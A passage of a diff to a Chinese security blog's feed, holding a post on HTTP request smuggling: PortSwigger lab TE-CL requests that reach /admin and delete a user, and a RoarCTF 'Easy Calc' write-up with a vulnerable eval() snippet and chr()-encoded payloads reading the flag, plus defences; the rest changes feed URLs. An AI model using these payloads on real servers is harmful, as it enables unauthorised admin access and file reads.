src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190536-739950.png" alt="题目"><br>这次利用TE-CL漏洞，构造数据包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">60</span><br><span class="line">POST /admin HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">\r\n</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>允许本地查看<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190544-763227.png" alt="1"><br>两次发出以下请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">71</span><br><span class="line">POST /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">\r\n</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功访问管理员页面<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190552-248001.png" alt="2"><br>更改走私的请求URL以删除用户carlos：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">87</span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">\r\n</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问管理员页面验证是否删除</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190623-841809.png" alt="3"></p><h2 id="CTF中的请求走私"><a href="#CTF中的请求走私" class="headerlink" title="CTF中的请求走私"></a>CTF中的请求走私</h2><p><strong>[RoarCTF 2019]Easy Calc</strong><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190649-214946.png" alt="题目"><br>calc.php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在phpifo页面中发现禁用了一些函数和字符，所以尝试绕过，可以利用请求走私。</p><p>利用CL-CL漏洞，返回400错误,同时可以看到phpinfo页面<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191236-584099.png" alt="CL-CL-phpinfo"><br><code>getcwd()</code>:获取到当前工作目录/var/www/html<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191456-261196.png" alt="getcwd"><br><code>var_dump(scandir(dirname(__FILE__)))</code>：获取当前目录下的文件<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191607-151742.png" alt="dir"><br><code>print_r(scandir(chr(47)))</code>：扫描根目录<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191701-2570.png" alt="ls"><br><code>var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>：读取flag<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191814-959740.png" alt="flag"><br>同样利用CL-TE漏洞同样可以读取flag<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/192008-795497.png" alt="cl-te"></p><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>在前端服务器通过同一网络连接将多个请求转发到后端服务器的情况下，会出现HTTP请求走私漏洞，并且后端连接所使用的协议会带来两个服务器不同意边界的风险。要求。防止HTTP请求走私漏洞的一些通用方法如下：</p><ul><li>禁用后端连接的重用，以便每个后端请求通过单独的网络连接发送。</li><li>使用HTTP / 2进行后端连接，因为此协议可防止对请求之间的边界产生歧义。</li><li>前端服务器和后端服务器使用完全相同的Web服务器软件，以便它们就请求之间的界限达成一致。</li></ul><p>在某些情况下，可以通过使前端服务器规范歧义请求或使后端服务器拒绝歧义请求并关闭网络连接来避免漏洞。但是，这些方法比上面确定的通用缓解措施更容易出错。</p><p>参考文章：<br><a href="https://paper.seebug.org/1048">https://paper.seebug.org/1048</a><br><a href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a><br><a href="https://portswigger.net/web-security/request-smuggling/exploiting">https://portswigger.net/web-security/request-smuggling/exploiting</a></p>]]></content>
     
     
     <summary type="html">&lt;p&gt;摘要：HTTP请求走私漏洞&lt;/p&gt;</summary>
@@ -50,14 +50,14 @@
     
     
     
-    <category term="漏洞" scheme="https://atkx.gitee.io/tags/%E6%BC%8F%E6%B4%9E/"/>
+    <category term="漏洞" scheme="http://47.119.122.254/tags/%E6%BC%8F%E6%B4%9E/"/>
     
   </entry>
   
   <entry>
     <title>HTTP协议</title>
-    <link href="https://atkx.gitee.io/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/"/>
-    <id>https://atkx.gitee.io/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/</id>
+    <link href="http://47.119.122.254/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/"/>
+    <id>http://47.119.122.254/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/</id>
     <published>2021-04-11T06:30:15.000Z</published>
     <updated>2021-04-12T04:38:20.269Z</updated>
     
@@ -69,14 +69,14 @@
     
     
     
-    <category term="协议基础" scheme="https://atkx.gitee.io/tags/%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/"/>
+    <category term="协议基础" scheme="http://47.119.122.254/tags/%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/"/>
     
   </entry>
   
   <entry>
     <title>虎符+红明谷+ctfshow渔人杯赛后复现</title>
-    <link href="https://atkx.gitee.io/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"/>
-    <id>https://atkx.gitee.io/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/</id>
+    <link href="http://47.119.122.254/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://47.119.122.254/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/</id>
     <published>2021-04-05T13:40:02.000Z</published>
     <updated>2021-04-12T05:00:46.255Z</updated>
     
@@ -88,14 +88,14 @@
     
     
     
-    <category term="Write up" scheme="https://atkx.gitee.io/tags/Write-up/"/>
+    <category term="Write up" scheme="http://47.119.122.254/tags/Write-up/"/>
     
   </entry>
   
   <entry>
     <title>Struts2核心配置</title>
-    <link href="https://atkx.gitee.io/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"/>
-    <id>https://atkx.gitee.io/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/</id>
+    <link href="http://47.119.122.254/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"/>
+    <id>http://47.119.122.254/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/</id>
     <published>2021-03-28T11:24:14.000Z</published>
     <updated>2021-04-03T14:12:26.992Z</updated>
     
@@ -106,17 +106,17 @@
     
     
     
-    <category term="SSH" scheme="https://atkx.gitee.io/categories/SSH/"/>
+    <category term="SSH" scheme="http://47.119.122.254/categories/SSH/"/>
     
     
-    <category term="Struts2" scheme="https://atkx.gitee.io/tags/Struts2/"/>
+    <category term="Struts2" scheme="http://47.119.122.254/tags/Struts2/"/>
     
   </entry>
   
   <entry>
     <title>CTFshow-Web入门-信息泄露</title>
-    <link href="https://atkx.gitee.io/2021/03/26/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
-    <id>https://atkx.gitee.io/2021/03/26/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</id>
+    <link href="http://47.119.122.254/2021/03/26/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    <id>http://47.119.122.254/2021/03/26/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</id>
     <published>2021-03-26T14:28:01.000Z</published>
     <updated>2021-04-04T14:02:37.271Z</updated>
     
@@ -127,21 +127,21 @@
     
     
     
-    <category term="CTF" scheme="https://atkx.gitee.io/categories/CTF/"/>
+    <category term="CTF" scheme="http://47.119.122.254/categories/CTF/"/>
     
-    <category term="WEB" scheme="https://atkx.gitee.io/categories/CTF/WEB/"/>
+    <category term="WEB" scheme="http://47.119.122.254/categories/CTF/WEB/"/>
     
     
-    <category term="信息泄露" scheme="https://atkx.gitee.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    <category term="信息泄露" scheme="http://47.119.122.254/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
     
-    <category term="CTFshow" scheme="https://atkx.gitee.io/tags/CTFshow/"/>
+    <category term="CTFshow" scheme="http://47.119.122.254/tags/CTFshow/"/>
     
   </entry>
   
   <entry>
     <title>Struts2框架入门</title>
-    <link href="https://atkx.gitee.io/2021/03/19/Struts2%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/"/>
-    <id>https://atkx.gitee.io/2021/03/19/Struts2%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/</id>
+    <link href="http://47.119.122.254/2021/03/19/Struts2%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/"/>
+    <id>http://47.119.122.254/2021/03/19/Struts2%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/</id>
     <published>2021-03-19T12:26:02.000Z</published>
     <updated>2021-04-03T14:10:48.348Z</updated>
     
@@ -152,17 +152,17 @@
     
     
     
-    <category term="SSH" scheme="https://atkx.gitee.io/categories/SSH/"/>
+    <category term="SSH" scheme="http://47.119.122.254/categories/SSH/"/>
     
     
-    <category term="Struts2" scheme="https://atkx.gitee.io/tags/Struts2/"/>
+    <category term="Struts2" scheme="http://47.119.122.254/tags/Struts2/"/>
     
   </entry>
   
   <entry>
     <title>春秋杯新年欢乐赛</title>
-    <link href="https://atkx.gitee.io/2021/02/09/%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/"/>
-    <id>https://atkx.gitee.io/2021/02/09/%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/</id>
+    <link href="http://47.119.122.254/2021/02/09/%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/"/>
+    <id>http://47.119.122.254/2021/02/09/%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/</id>
     <published>2021-02-09T14:25:13.000Z</published>
     <updated>2021-04-12T05:16:52.740Z</updated>
     
@@ -174,14 +174,14 @@
     
     
     
-    <category term="Write up" scheme="https://atkx.gitee.io/tags/Write-up/"/>
+    <category term="Write up" scheme="http://47.119.122.254/tags/Write-up/"/>
     
   </entry>
   
   <entry>
     <title>CTFHub-Web-RCE练习</title>
-    <link href="https://atkx.gitee.io/2021/01/16/CTFHub-Web-RCE%E7%BB%83%E4%B9%A0/"/>
-    <id>https://atkx.gitee.io/2021/01/16/CTFHub-Web-RCE%E7%BB%83%E4%B9%A0/</id>
+    <link href="http://47.119.122.254/2021/01/16/CTFHub-Web-RCE%E7%BB%83%E4%B9%A0/"/>
+    <id>http://47.119.122.254/2021/01/16/CTFHub-Web-RCE%E7%BB%83%E4%B9%A0/</id>
     <published>2021-01-16T08:12:47.000Z</published>
     <updated>2021-04-04T14:01:52.304Z</updated>
     
@@ -192,21 +192,21 @@
     
     
     
-    <category term="CTF" scheme="https://atkx.gitee.io/categories/CTF/"/>
+    <category term="CTF" scheme="http://47.119.122.254/categories/CTF/"/>
     
-    <category term="WEB" scheme="https://atkx.gitee.io/categories/CTF/WEB/"/>
+    <category term="WEB" scheme="http://47.119.122.254/categories/CTF/WEB/"/>
     
     
-    <category term="CTFhub" scheme="https://atkx.gitee.io/tags/CTFhub/"/>
+    <category term="CTFhub" scheme="http://47.119.122.254/tags/CTFhub/"/>
     
-    <category term="命令执行" scheme="https://atkx.gitee.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    <category term="命令执行" scheme="http://47.119.122.254/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
   <entry>
     <title>线下AWD攻防赛总结</title>
-    <link href="https://atkx.gitee.io/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
-    <id>https://atkx.gitee.io/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/</id>
+    <link href="http://47.119.122.254/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
+    <id>http://47.119.122.254/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/</id>
     <published>2021-01-16T04:03:43.000Z</published>
     <updated>2021-03-27T03:50:41.660Z</updated>
     
@@ -217,17 +217,17 @@
     
     
     
-    <category term="CTF" scheme="https://atkx.gitee.io/categories/CTF/"/>
+    <category term="CTF" scheme="http://47.119.122.254/categories/CTF/"/>
     
     
-    <category term="AWD" scheme="https://atkx.gitee.io/tags/AWD/"/>
+    <category term="AWD" scheme="http://47.119.122.254/tags/AWD/"/>
     
   </entry>
   
   <entry>
     <title>CTFHub-Web-文件上传练习</title>
-    <link href="https://atkx.gitee.io/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/"/>
-    <id>https://atkx.gitee.io/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/</id>
+    <link href="http://47.119.122.254/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/"/>
+    <id>http://47.119.122.254/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/</id>
     <published>2020-11-22T11:46:56.000Z</published>
     <updated>2021-04-04T14:02:23.418Z</updated>
     
@@ -238,21 +238,21 @@
     
     
     
-    <category term="CTF" scheme="https://atkx.gitee.io/categories/CTF/"/>
+    <category term="CTF" scheme="http://47.119.122.254/categories/CTF/"/>
     
-    <category term="WEB" scheme="https://atkx.gitee.io/categories/CTF/WEB/"/>
+    <category term="WEB" scheme="http://47.119.122.254/categories/CTF/WEB/"/>
     
     
-    <category term="CTFhub" scheme="https://atkx.gitee.io/tags/CTFhub/"/>
+    <category term="CTFhub" scheme="http://47.119.122.254/tags/CTFhub/"/>
     
-    <category term="文件上传" scheme="https://atkx.gitee.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <category term="文件上传" scheme="http://47.119.122.254/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
     
   </entry>
   
   <entry>
     <title>CTFHub-Web-sql注入练习</title>
-    <link href="https://atkx.gitee.io/2020/11/15/CTFHub-Web-sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/"/>
-    <id>https://atkx.gitee.io/2020/11/15/CTFHub-Web-sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/</id>
+    <link href="http://47.119.122.254/2020/11/15/CTFHub-Web-sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/"/>
+    <id>http://47.119.122.254/2020/11/15/CTFHub-Web-sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/</id>
     <published>2020-11-15T04:53:30.000Z</published>
     <updated>2021-04-04T14:02:16.435Z</updated>
     
@@ -263,21 +263,21 @@
     
     
     
-    <category term="CTF" scheme="https://atkx.gitee.io/categories/CTF/"/>
+    <category term="CTF" scheme="http://47.119.122.254/categories/CTF/"/>
     
-    <category term="WEB" scheme="https://atkx.gitee.io/categories/CTF/WEB/"/>
+    <category term="WEB" scheme="http://47.119.122.254/categories/CTF/WEB/"/>
     
     
-    <category term="CTFhub" scheme="https://atkx.gitee.io/tags/CTFhub/"/>
+    <category term="CTFhub" scheme="http://47.119.122.254/tags/CTFhub/"/>
     
-    <category term="SQL注入" scheme="https://atkx.gitee.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    <category term="SQL注入" scheme="http://47.119.122.254/tags/SQL%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
   <entry>
     <title>代码审计之弱类型绕过</title>
-    <link href="https://atkx.gitee.io/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/"/>
-    <id>https://atkx.gitee.io/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/</id>
+    <link href="http://47.119.122.254/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/"/>
+    <id>http://47.119.122.254/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/</id>
     <published>2020-11-04T07:48:04.000Z</published>
     <updated>2021-03-27T03:44:30.948Z</updated>
     
@@ -288,19 +288,19 @@
     
     
     
-    <category term="CTF" scheme="https://atkx.gitee.io/categories/CTF/"/>
+    <category term="CTF" scheme="http://47.119.122.254/categories/CTF/"/>
     
-    <category term="WEB" scheme="https://atkx.gitee.io/categories/CTF/WEB/"/>
+    <category term="WEB" scheme="http://47.119.122.254/categories/CTF/WEB/"/>
     
     
-    <category term="代码审计" scheme="https://atkx.gitee.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    <category term="代码审计" scheme="http://47.119.122.254/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
   </entry>
   
   <entry>
     <title>CTFHub-Web-信息泄露练习</title>
-    <link href="https://atkx.gitee.io/2020/10/24/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%BB%83%E4%B9%A0/"/>
-    <id>https://atkx.gitee.io/2020/10/24/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%BB%83%E4%B9%A0/</id>
+    <link href="http://47.119.122.254/2020/10/24/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%BB%83%E4%B9%A0/"/>
+    <id>http://47.119.122.254/2020/10/24/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%BB%83%E4%B9%A0/</id>
     <published>2020-10-24T15:55:23.000Z</published>
     <updated>2021-04-04T14:02:30.030Z</updated>
     
@@ -311,21 +311,21 @@
     
     
     
-    <category term="CTF" scheme="https://atkx.gitee.io/categories/CTF/"/>
+    <category term="CTF" scheme="http://47.119.122.254/categories/CTF/"/>
     
-    <category term="WEB" scheme="https://atkx.gitee.io/categories/CTF/WEB/"/>
+    <category term="WEB" scheme="http://47.119.122.254/categories/CTF/WEB/"/>
     
     
-    <category term="CTFhub" scheme="https://atkx.gitee.io/tags/CTFhub/"/>
+    <category term="CTFhub" scheme="http://47.119.122.254/tags/CTFhub/"/>
     
-    <category term="信息泄露" scheme="https://atkx.gitee.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    <category term="信息泄露" scheme="http://47.119.122.254/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
     
   </entry>
   
   <entry>
     <title>浅谈PHP反序列化漏洞</title>
-    <link href="https://atkx.gitee.io/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
-    <id>https://atkx.gitee.io/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
+    <link href="http://47.119.122.254/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://47.119.122.254/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
     <published>2020-10-18T07:44:31.000Z</published>
     <updated>2021-02-05T05:30:15.037Z</updated>
     
@@ -336,19 +336,19 @@
     
     
     
-    <category term="CTF" scheme="https://atkx.gitee.io/categories/CTF/"/>
+    <category term="CTF" scheme="http://47.119.122.254/categories/CTF/"/>
     
-    <category term="WEB" scheme="https://atkx.gitee.io/categories/CTF/WEB/"/>
+    <category term="WEB" scheme="http://47.119.122.254/categories/CTF/WEB/"/>
     
     
-    <category term="PHP" scheme="https://atkx.gitee.io/tags/PHP/"/>
+    <category term="PHP" scheme="http://47.119.122.254/tags/PHP/"/>
     
   </entry>
   
   <entry>
     <title>RSA算法详解与练习</title>
-    <link href="https://atkx.gitee.io/2020/10/04/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%83%E4%B9%A0/"/>
-    <id>https://atkx.gitee.io/2020/10/04/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%83%E4%B9%A0/</id>
+    <link href="http://47.119.122.254/2020/10/04/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%83%E4%B9%A0/"/>
+    <id>http://47.119.122.254/2020/10/04/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%83%E4%B9%A0/</id>
     <published>2020-10-04T07:50:38.000Z</published>
     <updated>2021-02-05T04:28:08.191Z</updated>
     
@@ -359,19 +359,19 @@
     
     
     
-    <category term="CTF" scheme="https://atkx.gitee.io/categories/CTF/"/>
+    <category term="CTF" scheme="http://47.119.122.254/categories/CTF/"/>
     
-    <category term="CRYPTO" scheme="https://atkx.gitee.io/categories/CTF/CRYPTO/"/>
+    <category term="CRYPTO" scheme="http://47.119.122.254/categories/CTF/CRYPTO/"/>
     
     
-    <category term="RSA" scheme="https://atkx.gitee.io/tags/RSA/"/>
+    <category term="RSA" scheme="http://47.119.122.254/tags/RSA/"/>
     
   </entry>
   
   <entry>
     <title>CTF-MISC总结</title>
-    <link href="https://atkx.gitee.io/2020/04/20/CTF-MISC%E6%80%BB%E7%BB%93/"/>
-    <id>https://atkx.gitee.io/2020/04/20/CTF-MISC%E6%80%BB%E7%BB%93/</id>
+    <link href="http://47.119.122.254/2020/04/20/CTF-MISC%E6%80%BB%E7%BB%93/"/>
+    <id>http://47.119.122.254/2020/04/20/CTF-MISC%E6%80%BB%E7%BB%93/</id>
     <published>2020-04-20T13:40:24.000Z</published>
     <updated>2021-04-12T12:13:55.541Z</updated>
     
@@ -383,14 +383,14 @@
     
     
     
-    <category term="MISC" scheme="https://atkx.gitee.io/tags/MISC/"/>
+    <category term="MISC" scheme="http://47.119.122.254/tags/MISC/"/>
     
   </entry>
   
   <entry>
     <title>个人博客搭建历程</title>
-    <link href="https://atkx.gitee.io/2020/02/04/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8E%86%E7%A8%8B/"/>
-    <id>https://atkx.gitee.io/2020/02/04/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8E%86%E7%A8%8B/</id>
+    <link href="http://47.119.122.254/2020/02/04/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8E%86%E7%A8%8B/"/>
+    <id>http://47.119.122.254/2020/02/04/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8E%86%E7%A8%8B/</id>
     <published>2020-02-04T06:59:23.000Z</published>
